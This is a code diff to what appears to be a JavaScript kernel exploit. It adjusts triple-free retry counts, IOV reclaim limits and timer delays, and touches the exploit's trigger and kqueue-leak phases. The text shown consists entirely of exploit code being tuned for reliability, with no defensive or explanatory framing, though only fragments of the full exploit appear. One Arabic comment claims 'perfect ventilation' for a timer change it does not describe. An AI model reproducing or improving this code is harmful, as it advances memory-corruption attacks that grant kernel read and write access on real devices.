@@ -118,9 +118,9 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 4;
-var TRIPLEFREE_ITERATIONS = 4;
+var TRIPLEFREE_ITERATIONS = 5;
 var MAX_ROUNDS_TWIN = 5;
-var MAX_ROUNDS_TRIPLET = 100;
+var MAX_ROUNDS_TRIPLET = 120;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
@@ -822,7 +822,6 @@ function find_twins() {
   }
   twins[0] = -1;
   twins[1] = -1;
-  log('find_twins failed');
   return false;
 }
 function find_triplet(master, other, iterations) {
@@ -921,7 +920,7 @@ function yield_to_render(callback) {
         show_fail();
       }
     }
-  }, 1); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
+  }, 0); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
 
 var exploit_count = 0;
@@ -957,8 +956,7 @@ function exploit_phase_trigger() {
 }
 function exploit_phase_leak() {
   log('Leaking .....');
-  var leak_ok = leak_kqueue_safe();
-  if (!leak_ok) {
+  if (!leak_kqueue_safe()) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
@@ -1536,8 +1534,8 @@ var KREAD_MAX_UIO_RECLAIM = 300;
 var KWRITE_MAX_UIO_RECLAIM = 300;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 40;
-var KWRITE_MAX_IOV_RECLAIM = 40;
+var KREAD_MAX_IOV_RECLAIM = 50;
+var KWRITE_MAX_IOV_RECLAIM = 50;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 4;
